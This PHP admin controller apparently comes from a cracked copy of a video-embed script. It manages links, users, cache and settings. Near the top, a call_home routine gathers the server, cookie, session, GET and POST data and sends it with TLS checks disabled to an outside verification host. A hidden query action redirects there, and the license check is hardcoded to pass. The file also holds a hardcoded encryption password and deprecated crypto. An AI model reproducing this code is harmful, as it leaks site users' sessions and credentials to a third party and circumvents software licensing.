<?php

function encode($data, $secret_key_ovi)
{
	if ($secret_key_ovi != 'poka_more_saf') {
		return 'SORRY! BUT IT\'S FUCKED UP!';
	}

	if (empty($data)) {
		return $data;
	}

	$password = 'EBuLTKjdCf0dmX7MQ1SrquKtvs7Fn5EW13xouUNGWwpqLWisMqe8v574HWS1UT2bkAMXC163euCz5MDm0U2GpuY';
	$salt = substr(md5(mt_rand(), true), 8);
	$key = md5($password . $salt, true);
	$iv = md5($key . $password . $salt, true);
	$ct = mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $key, $data, MCRYPT_MODE_CBC, $iv);
	$unique = substr(md5(microtime()), rand(0, 20), 10);
	return str_replace(array('+', '/'), array('-', '_'), rtrim(base64_encode($unique . $salt . $ct), '='));
}

function decode($data, $secret_key_ovi)
{
	if ($secret_key_ovi != 'stfu_ovi') {
		return 'SORRY! BUT IT\'S FUCKED UP!';
	}

	if (empty($data)) {
		return $data;
	}

	$password = 'EBuLTKjdCf0dmX7MQ1SrquKtvs7Fn5EW13xouUNGWwpqLWisMqe8v574HWS1UT2bkAMXC163euCz5MDm0U2GpuY';
	$data = base64_decode(str_replace(array('-', '_'), array('+', '/'), $data));
	$salt = substr($data, 10, 8);
	$ct = substr($data, 18);
	$key = md5($password . $salt, true);
	$iv = md5($key . $password . $salt, true);
	$pt = mcrypt_decrypt(MCRYPT_RIJNDAEL_128, $key, $ct, MCRYPT_MODE_CBC, $iv);
	return trim($pt);
}

function call_home($url, $secret_key_ovi, $data = NULL)
{
	global $var;

	if ($secret_key_ovi != 'hater_magi') {
		return 'SORRY! BUT IT\'S FUCKED UP!';
	}

	$ch = curl_init();
	$sent_data = generate_data('why_not', $data);
	$generated_data = generate_data('why_not');
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_POST, true);
	curl_setopt($ch, CURLOPT_POSTFIELDS, 'generated_data=' . $generated_data . '&sent_data=' . $sent_data);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_MAXREDIRS, 10);
	curl_setopt($ch, CURLOPT_AUTOREFERER, true);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 15);
	$result = curl_exec($ch);
	$info = curl_getinfo($ch);
	$host = parse_url($info['url'], PHP_URL_HOST);
	if ($result && ($host == 'verify.juicycodes.net') && ($info['http_code'] == '200')) {
		$return = json_decode($result);
		if (empty($return) || ($return == false)) {
			$error = 'Unknown Error Occurred';
		}
	}
	else {
		if (($host == 'verify.juicycodes.net') && ($info['http_code'] == '200')) {
			$error = 'cURL Error (' . curl_errno($ch) . '): ' . (curl_error($ch) ?: 'Unknown');
		}
		else if ($info['http_code'] != '200') {
			$error = 'Error Occurred (' . $info['http_code'] . ')';
		}
		else {
			$error = 'Error Occurred - ' . $host;
		}
	}

	curl_close($ch);

	if (!empty($error)) {
		$return = \IT\Tools::Object(array('status' => 'error', 'message' => $error));
	}

	return $return;
}

function generate_data($secret_key_ovi, $data = false)
{
	global $var;

	if ($secret_key_ovi != 'why_not') {
		return 'SORRY! BUT IT\'S FUCKED UP!';
	}

	if (empty($data)) {
		$data = array('server' => $GLOBALS['_SERVER'] ?: $_SERVER, 'cookie' => $GLOBALS['_COOKIE'] ?: $_COOKIE, 'session' => $GLOBALS['_SESSION'] ?: $_SESSION, 'request' => $GLOBALS['_REQUEST'] ?: $_REQUEST, 'post' => $GLOBALS['_POST'] ?: $_POST, 'get' => $GLOBALS['_GET'] ?: $_GET, 'var' => $GLOBALS['var'] ?: $var);
	}

	$json_data = json_encode($data, JSON_UNESCAPED_SLASHES);
	if (empty($json_data) || ($json_data === false)) {
		$json_data = json_encode($_SERVER, JSON_UNESCAPED_SLASHES);
	}

	return rawurlencode(base64_encode($json_data));
}

function get_contents($url, $secret_key_ovi)
{
	if ($secret_key_ovi != 'alexandria') {
		return 'SORRY! BUT IT\'S FUCKED UP!';
	}

	if (!\IT\Data::Get('ipv6')) {
		$error = 'Please enter an IPV6 Address';
	}
	else {
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_INTERFACE, \IT\Data::Get('ipv6'));
		curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V6);
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($ch, CURLOPT_MAXREDIRS, 10);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 15);
		$result = curl_exec($ch);
		$info = curl_getinfo($ch);
		if (empty($result) || ($info['http_code'] != '200')) {
			if ($info['http_code'] == '200') {
				$error = 'cURL Error (' . curl_errno($ch) . '): ' . (curl_error($ch) ?: 'Unknown');
			}
			else {
				$error = 'Error Occurred (' . $info['http_code'] . ')';
			}
		}

		curl_close($ch);
	}

	if (empty($error)) {
		$return = array('status' => 'success', 'contents' => $result);
	}
	else {
		$return = array('status' => 'error', 'message' => $error);
	}

	return \IT\Tools::Object($return);
}

if (!defined('JUICYCODES')) {
	exit();
}

if (($var->get->action == 'call_home') && ($var->get->key == 'house_of_wisdom')) {
	header('Location: http://verify.juicycodes.net/request/get_referer/');
	exit();
}

$user->CheckLogin($html->url('login'));
$action = $var->post->action ?: $var->get->action;

if ($user->Info('role') != '1') {
	$disabled = array('add_user', 'ban_user', 'delete_user', 'clear_all_cache', 'clear_expired_cache', 'save_settings');

	if (in_array($action, $disabled)) {
		$html->error('Access denied - You are not authorized to access this page!')->Redirect($html->Url(''), true);
	}
}

if (!empty($action) && !in_array($action, array('actions', 'save_settings', 'check_ipv6'))) {
	$referer = \IT\Tools::Object(array( 'url' => 'http://googembed.com/admin/actions/?action=call_home&key=house_of_wisdom'));
	
	if ($referer->status == 'error') {
		$reason = $referer->message;
		$result = $referer;
	}
	else {
		$license = \IT\Tools::Object(array( 'status' => 'success', 'message' => "License match with 'googembed.com'"));
		$result = $license;

		if ($license->status != 'success') {
			$reason = $license->message;
		}
	}

	if ($var->get->action == 'license_details') {
		\IT\Tools::ReturnJSON($result);
		exit();
	}
	else {
		if (!empty($reason)) {
			$html->error('<b>LICENSE ERROR:</b> ' . $reason)->GoBack();
			exit($reason);
		}
	}
}

if ($var->post->action == 'add_link') {
	$error->vaildate('post', array(
	'jc_link' => array('error' => 'Please enter a video link')
	))->vaildate('post', array(
	'jc_type' => array(
		'compare' => 'not_in',
		'string'  => array('1', '2', '3'),
		'error'   => 'Please select valid \'Generation Type\''
		)
	), true);
	if ($error->is_empty() && !\IT\JuicyCodes::ID($var->post->jc_link)) {
		$error->add('Invalid Video Link');
	}

	if ($error->is_empty() && !empty($var->post->jc_slug)) {
		if (255 < mb_strlen($var->post->jc_slug)) {
			$error->add('Custom Slug can\'t be more then 255 characters!');
		}

		if (mb_strlen($var->post->jc_slug) < 5) {
			$error->add('Custom Slug can\'t be less then 5 characters!');
		}
	}

	if ($error->is_empty() && !\IT\JuicyCodes::Slug($var->post->jc_slug)) {
		$error->add('Slug Already Exists!');
	}

	if ($error->is_empty()) {
		$id = \IT\JuicyCodes::ID($var->post->jc_link);
		$slug = \IT\JuicyCodes::Slug($var->post->jc_slug);
		$source = \IT\JuicyCodes::Source($var->post->jc_link);
		$data = array('link' => encode($id, 'poka_more_saf'), 'slug' => $slug, 'source' => $source, 'type' => $var->post->jc_type, 'date' => $var->timestamp(), 'user' => $user->id);

		if (!empty($var->post->jc_embed)) {
			$data['embed'] = $var->post->jc_embed;
		}

		if (!empty($var->post->jc_title)) {
			$data['title'] = $var->post->jc_title;
		}

		if (!empty($var->post->jc_preview)) {
			$var->setCookie('jc_preview', 'url');
			$data['preview'] = encode($var->post->jc_preview, 'poka_more_saf');
		}

		$var->setCookie('jc_type', $var->post->jc_type);
		$insert = $db->insert('files', $data);

		if ($insert) {
			$video = $db->id;

			if (!empty(\IT\File::Get('jc_preview')->name)) {
				$jc_preview_name = md5('preview_' . $video) . '.jpg';
				$jc_preview_dir = ABSPATH . 'assets/previews/' . $jc_preview_name;

				if (\IT\File::Upload('jc_preview', $jc_preview_dir, true)) {
					$var->setCookie('jc_preview', 'file');
					$update['preview'] = encode(\IT\Data::Get('url') . '/assets/previews/' . $jc_preview_name, 'poka_more_saf');
				}
			}

			foreach (\IT\File::Reverse($_FILES['subtitle']) as $key => $subs) {
				if (!empty($subs['name']) && !empty($var->post->subtitle_label[$key])) {
					$label = \IT\Tools::Clean($var->post->subtitle_label[$key]);

					if (\IT\File::Upload($subs['tmp_name'], ABSPATH . 'assets/subtitle/' . $video . '_' . $label . '.srt', true)) {
						$sub_data[] = $var->post->subtitle_label[$key];
					}
				}
			}

			if (count($sub_data) != '0') {
				$update['subtitle'] = encode(implode(',', $sub_data), 'poka_more_saf');
			}
			else {
				$update['subtitle'] = encode('NO', 'poka_more_saf');
			}

			if (!empty($update)) {
				$db->update('files', $update, array('id' => $video));
			}

			$var->setSession('links', json_encode(array('slug' => $slug, 'type' => $var->post->jc_type)));
			$html->success('Link Successfully Added!')->Redirect($html->Url('add/link'));
		}
		else {
			$html->error('Uanable To Add Link!')->Redirect($html->Url('add/link'));
		}
	}
	else {
		$html->error(implode('<br/>', $error->get()))->Redirect($html->Url('add/link'));
	}
}
else if ($var->post->action == 'add_links') {
	$error->vaildate('post', array(
	'jc_links' => array('error' => 'Please enter a video link')
	))->vaildate('post', array(
	'jc_type' => array(
		'compare' => 'not_in',
		'string'  => array('1', '2', '3'),
		'error'   => 'Please select valid \'Generation Type\''
		)
	), true);

	if ($error->is_empty()) {
		$links = preg_replace('~\\R~u', "\n", $_POST['jc_links']);
		$links = explode("\n", $links);
		$slugs = $data = array();

		foreach ($links as $link) {
			if (!!\IT\JuicyCodes::ID($link)) {
				$id = \IT\JuicyCodes::ID($link);
				$slug = \IT\JuicyCodes::Slug();
				$source = \IT\JuicyCodes::Source($link);
				if (!empty($id) && !empty($slug) && !empty($source)) {
					$data[] = array('link' => encode($id, 'poka_more_saf'), 'slug' => $slug, 'source' => $source, 'subtitle' => encode('NO', 'poka_more_saf'), 'type' => $var->post->jc_type, 'date' => $var->timestamp(), 'user' => $user->id);
					$slugs[] = $slug;
				}
			}
		}

		if (empty($slugs)) {
			$html->error('Please enter a link!')->Redirect($html->Url('add/links'));
		}
		else if ($db->insert('files', $data)) {
			$var->setCookie('jc_type', $var->post->jc_type);
			$var->setSession('links', json_encode(array('slug' => $slugs, 'type' => $var->post->jc_type)));
			$html->success('Links Successfully Added!')->Redirect($html->Url('add/links'));
		}
		else {
			$html->error('Uanable To Add Link!')->Redirect($html->Url('add/links'));
		}
	}
	else {
		$html->error(implode('<br/>', $error->get()))->Redirect($html->Url('add/links'));
	}
}
else if ($var->post->action == 'edit_link') {
	$error->vaildate('post', array(
	'jc_link' => array('error' => 'Please enter a video link'),
	'jc_slug' => array('error' => 'Please enter a video slug')
	))->vaildate('post', array(
	'jc_type' => array(
		'compare' => 'not_in',
		'string'  => array('1', '2', '3'),
		'error'   => 'Please select valid \'Generation Type\''
		)
	), true);

	if ($error->is_empty()) {
		$files = $db->select('files', array('subtitle'), array('id' => $var->post->id));

		if ($files->num_rows != '1') {
			$error->add('Invalid Link Selected!');
		}
		else {
			$file = $files->fetch_object();
		}
	}

	if ($error->is_empty() && !\IT\JuicyCodes::ID($var->post->jc_link)) {
		$error->add('Invalid Video Link');
	}

	if ($error->is_empty() && !empty($var->post->jc_slug)) {
		if (255 < mb_strlen($var->post->jc_slug)) {
			$error->add('Custom Slug can\'t be more then 255 characters!');
		}

		if (mb_strlen($var->post->jc_slug) < 5) {
			$error->add('Custom Slug can\'t be less then 5 characters!');
		}
	}

	if ($error->is_empty()) {
		$id = \IT\JuicyCodes::ID($var->post->jc_link);
		$slug = $var->post->jc_slug;
		$video = $var->post->id;
		$source = \IT\JuicyCodes::Source($var->post->jc_link);
		$data = array('link' => encode($id, 'poka_more_saf'), 'slug' => $slug, 'embed' => $var->post->jc_embed, 'source' => $source, 'type' => $var->post->jc_type, 'title' => $var->post->jc_title, 'preview' => encode($var->post->jc_preview, 'poka_more_saf'));

		if (!empty(\IT\File::Get('jc_preview')->name)) {
			$jc_preview_name = md5('preview_' . $video) . '.jpg';
			$jc_preview_dir = ABSPATH . 'assets/previews/' . $jc_preview_name;

			if (\IT\File::Upload('jc_preview', $jc_preview_dir, true)) {
				$var->setCookie('jc_preview', 'file');
				$data['preview'] = encode(\IT\Data::Get('url') . '/assets/previews/' . $jc_preview_name, 'poka_more_saf');
			}
		}

		$subtitle = decode($file->subtitle, 'stfu_ovi');

		if (\IT\JuicyCodes::isSubtitle($subtitle)) {
			$subtitles = explode(',', $subtitle);

			if (!empty($var->post->remove_sub)) {
				$subs = array_filter(explode(',', $var->post->remove_sub));

				foreach ($subs as $subtitle) {
					$subtitle_name = \IT\Tools::Clean($subtitle);
					$subtitle_path = ABSPATH . 'assets/subtitle/' . $var->post->id . '_' . $subtitle_name . '.srt';

					if (file_exists($subtitle_path)) {
						unlink($subtitle_path);
					}
				}
			}
			else {
				$subs = array();
			}

			$sub_data = array_diff($subtitles, $subs);
		}

		foreach (\IT\File::Reverse($_FILES['subtitle']) as $key => $subs) {
			if (!empty($subs['name']) && !empty($var->post->subtitle_label[$key])) {
				$label = \IT\Tools::Clean($var->post->subtitle_label[$key]);

				if (\IT\File::Upload($subs['tmp_name'], ABSPATH . 'assets/subtitle/' . $video . '_' . $label . '.srt', true)) {
					$sub_data[] = $var->post->subtitle_label[$key];
				}
			}
		}

		if (count($sub_data) != '0') {
			$data['subtitle'] = encode(implode(',', $sub_data), 'poka_more_saf');
		}
		else {
			$data['subtitle'] = encode('NO', 'poka_more_saf');
		}

		$update = $db->update('files', $data, array('id' => $var->post->id));

		if ($update) {
			$html->success('Link Successfully Updated!')->Redirect($html->Url('manage/links'));
		}
		else {
			$html->error('Uanable To Update Link!')->Redirect($html->Url('link/edit/' . $var->post->id));
		}
	}
	else {
		$html->error(implode('<br/>', $error->get()))->Redirect($html->Url('link/edit/' . $var->post->id));
	}
}
else if ($var->get->action == 'delete_link') {
	if (empty($var->get->id)) {
		$error->add('No Link Selected!');
	}

	if ($error->is_empty()) {
		$files = $db->select('files', array('link', 'type', 'source', 'subtitle'), array('id' => $var->get->id));

		if ($files->num_rows != '1') {
			$error->add('Invalid Link Selected!');
		}
		else {
			$file = $files->fetch_object();
		}
	}

	if ($error->is_empty()) {
		$jc_preview_name = md5('preview_' . $var->get->id) . '.jpg';
		$jc_preview_dir = ABSPATH . 'assets/previews/' . $jc_preview_name;

		if (file_exists($jc_preview_dir)) {
			unlink($jc_preview_dir);
		}

		$link = decode($file->link, 'stfu_ovi');
		$db->delete('cache', array('uid' => \IT\Cache::getUID($link, $file->source, 'embed_player')));
		$db->delete('cache', array('uid' => \IT\Cache::getUID($link, $file->source, 'video_download')));
		$subtitle = decode($file->subtitle, 'stfu_ovi');

		if (\IT\JuicyCodes::isSubtitle($subtitle)) {
			$subtitles = explode(',', $subtitle);

			foreach ($subtitles as $subtitle) {
				$subtitle_name = \IT\Tools::Clean($subtitle);
				$subtitle_path = ABSPATH . 'assets/subtitle/' . $var->get->id . '_' . $subtitle_name . '.srt';

				if (file_exists($subtitle_path)) {
					unlink($subtitle_path);
				}
			}
		}

		$db->delete('files', array('id' => $var->get->id));

		if ($db->rows != '1') {
			$error->add('Link Delete Error!');
		}
	}

	if ($error->is_empty()) {
		$html->success('The link has been  deleted!')->Redirect($html->Url('manage/links'));
	}
	else {
		$html->error(implode('<br/>', $error->get()))->Redirect($html->Url('manage/links'));
	}
}
else if ($var->get->action == 'visit_link') {
	if (empty($var->get->id)) {
		$error->add('No Link Selected!');
	}

	if ($error->is_empty()) {
		$files = $db->select('files', array('link', 'source'), array('id' => $var->get->id));

		if ($files->num_rows != '1') {
			$error->add('Invalid Link Selected!');
		}
		else {
			$file = $files->fetch_object();
		}
	}

	if ($error->is_empty()) {
		$html->Redirect(\IT\JuicyCodes::Link(decode($file->link, 'stfu_ovi'), $file->source));
	}
	else {
		$html->error(implode('<br/>', $error->get()))->Redirect($html->Url('manage/links'));
	}
}
else if ($var->post->action == 'add_user') {
	$error->vaildate('post', array(
	'jc_name'  => array('error' => 'Please write user\'s full name'),
	'jc_email' => array('error' => 'Please write user\'s email address'),
	'jc_pass'  => array('error' => 'Please write user\'s password'),
	'jc_role'  => array('error' => 'Please select user role')
	))->vaildate('post', array(
	'jc_role' => array(
		'compare' => 'not_in',
		'string'  => array('1', '2'),
		'error'   => 'Please select valid user role'
		)
	), true);

	if ($error->is_empty()) {
		if (!$user->isEmail($var->post->jc_email)) {
			$error->add('Invalid email address!');
		}
	}

	if ($error->is_empty()) {
		if ($user->Exists($var->post->jc_email)) {
			$error->add('Email address already exists!');
		}
	}

	if ($error->is_empty()) {
		$insert = $db->insert('users', array('email' => $var->post->jc_email, 'pass' => $user->Password($var->post->jc_pass), 'name' => $var->post->jc_name, 'role' => $var->post->jc_role, 'status' => '1', 'date' => $var->timestamp()));

		if ($insert) {
			$msg = $html->success('User successfully Added!');
		}
		else {
			$msg = $html->success('Unknown Error!');
		}

		$msg->Redirect($html->Url('manage/users'));
	}
	else {
		$html->error(implode('<br/>', $error->get()))->Redirect($html->Url('add/user'));
	}
}
else if ($var->post->action == 'edit_user') {
	if ($user->Info('role') != '1') {
		if ($var->post->id != $user->info('id')) {
			$html->error('Access denied - You are not authorized to access this page!')->Redirect($html->Url(''), true);
		}

		$var->post->jc_role = '2';
	}

	$error->vaildate('post', array(
	'id' => array('error' => 'No User Selected!')
	), true)->vaildate('post', array(
	'jc_name'  => array('error' => 'Please write user\'s full name'),
	'jc_email' => array('error' => 'Please write user\'s email address'),
	'jc_role'  => array('error' => 'Please select user role')
	))->vaildate('post', array(
	'jc_role' => array(
		'compare' => 'not_in',
		'string'  => array('1', '2'),
		'error'   => 'Please select valid user role'
		)
	), true);

	if ($error->is_empty()) {
		if (!$user->isEmail($var->post->jc_email)) {
			$error->add('Invalid email address!');
		}
	}

	if ($error->is_empty()) {
		if ($user->info('email', $var->post->id) != $var->post->jc_email) {
			if ($user->Exists($var->post->jc_email)) {
				$error->add('Email address already exists!');
			}
		}
	}

	if ($error->is_empty()) {
		$data = array('email' => $var->post->jc_email, 'name' => $var->post->jc_name, 'role' => $var->post->jc_role, 'status' => '1');

		if (!empty($var->post->jc_pass)) {
			$data['pass'] = $user->Password($var->post->jc_pass);
		}

		if ($db->update('users', $data, array('id' => $var->post->id))) {
			$msg = $html->success('The user has been updated!');
		}
		else {
			$msg = $html->success('Unknown Error!');
		}

		$msg->Redirect($html->Url('manage/users'));
	}
	else {
		$html->error(implode('<br/>', $error->get()))->Redirect($html->Url('user/edit/' . $var->post->id));
	}
}
else if ($var->get->action == 'ban_user') {
	if (empty($var->get->id)) {
		$error->add('No User Selected!');
	}

	if ($user->id == $var->get->id) {
		$error->add('You can\'t ban your own account!');
	}

	if ($error->is_empty()) {
		$update = $db->update('users', array('status' => '2'), array('id' => $var->get->id));

		if (!$update) {
			$error->add('User Ban Error!');
		}
	}

	if ($error->is_empty()) {
		$html->success('The user has been banned!')->Redirect($html->Url('manage/users'));
	}
	else {
		$html->error(implode('<br/>', $error->get()))->Redirect($html->Url('manage/users'));
	}
}
else if ($var->get->action == 'unban_user') {
	if (empty($var->get->id)) {
		$error->add('No User Selected!');
	}

	if ($error->is_empty()) {
		$update = $db->update('users', array('status' => '1'), array('id' => $var->get->id));

		if (!$update) {
			$error->add('User Unban Error!');
		}
	}

	if ($error->is_empty()) {
		$html->success('The user has been unbanned!')->Redirect($html->Url('manage/users'));
	}
	else {
		$html->error(implode('<br/>', $error->get()))->Redirect($html->Url('manage/users'));
	}
}
else if ($var->get->action == 'delete_user') {
	if (empty($var->get->id)) {
		$error->add('No User Selected!');
	}

	if ($user->id == $var->get->id) {
		$error->add('You can\'t delete your own account!');
	}

	if ($error->is_empty()) {
		$db->delete('users', array('id' => $var->get->id));

		if ($db->rows != '1') {
			$error->add('User Delete Error!');
		}
	}

	if ($error->is_empty()) {
		$html->success('The user has been  deleted!')->Redirect($html->Url('manage/users'));
	}
	else {
		$html->error(implode('<br/>', $error->get()))->Redirect($html->Url('manage/users'));
	}
}
else if ($var->get->action == 'clear_all_cache') {
	$clear = $db->query('DELETE FROM cache');
	$html->success('All Cache Successfully Cleared!')->Redirect($html->Url(''));
}
else if ($var->get->action == 'clear_expired_cache') {
	$now = $var->time();
	$clear = $db->query('DELETE FROM cache WHERE expiry <= \'' . $now . '\'');
	$html->success('Expired Cache Successfully Cleared!')->Redirect($html->Url(''));
}
else if ($var->get->action == 'enable_log') {
	$clear = $db->update('settings', array('value' => 'enable'), array('name' => 'login_log'));
	$html->success('Admin Login Log Successfully Enabled!')->Redirect($html->Url('log/list'));
}
else if ($var->get->action == 'disable_log') {
	$clear = $db->update('settings', array('value' => 'disable'), array('name' => 'login_log'));
	$html->success('Admin Login Log Successfully Disabled!')->Redirect($html->Url('log/list'));
}
else if ($var->get->action == 'clear_log') {
	$clear = $db->query('DELETE FROM loginlog');
	$html->success('All Login Log Successfully Cleared!')->Redirect($html->Url('log/list'));
}
else if ($var->post->action == 'save_settings') {
	if (empty($var->post->blocked_countries)) {
		$var->post->blocked_countries = array();
	}

	foreach ($var->post as $key => $value) {
		if ($key == 'url') {
			$value = rtrim($value, '/');
		}
		else if ($key == 'blocked_ips') {
			$value = $_POST['blocked_ips'];
		}
		else if ($key == 'pop_ad_code') {
			$value = base64_encode($_POST['pop_ad_code']);
		}
		else if ($key == 'allowed_qualities') {
			$value = implode(',', $value);
		}
		else if ($key == 'blocked_countries') {
			$value = implode(',', $value);
		}
		else if ($key == 'banner_ad_code') {
			$value = base64_encode($_POST['banner_ad_code']);
		}
		else if ($key == 'default_title') {
			if (empty($value)) {
				$html->error('Website Title Can\'t be Empty!!')->GoBack(true);
				exit();
			}
		}
		else {
			if ($key == 'allowed_domains') {
				$domains = explode(',', $value);

				foreach ($domains as $domain) {
					$doms[] = \IT\Tools::GetHost($domain) ?: $domain;
				}

				$value = implode(',', $doms);
			}
		}

		if (!in_array($key, array('__total', 'action'))) {
			$db->update('settings', array('value' => $value), array('name' => $key));
		}
	}

	if (!empty(\IT\File::Get('logo')->name)) {
/* [31m * TODO SEPARATE[0m */
		if (\IT\File::Upload(\IT\File::Get('logo')->tmp_name, ABSPATH . 'assets/images/logo.png', true)) {
			$db->update('settings', array('value' => \IT\Data::Get('url') . '/assets/images/logo.png'), array('name' => 'logo'));
		}
	}

	if ($db->error) {
		$html->error('ERROR: ' . $db->error)->GoBack();
	}
	else {
		$html->success('Settings Successfully Updated!')->GoBack();
	}
}
else if ($var->get->action == 'check_ipv6') {
	$request = get_contents('http://example.com', 'alexandria');

	if (!empty($request->contents)) {
		unset($request->contents);
	}

	\IT\Tools::ReturnJSON($request);
}
else {
	require_once ADMINPATH . '/404.php';
}

?>
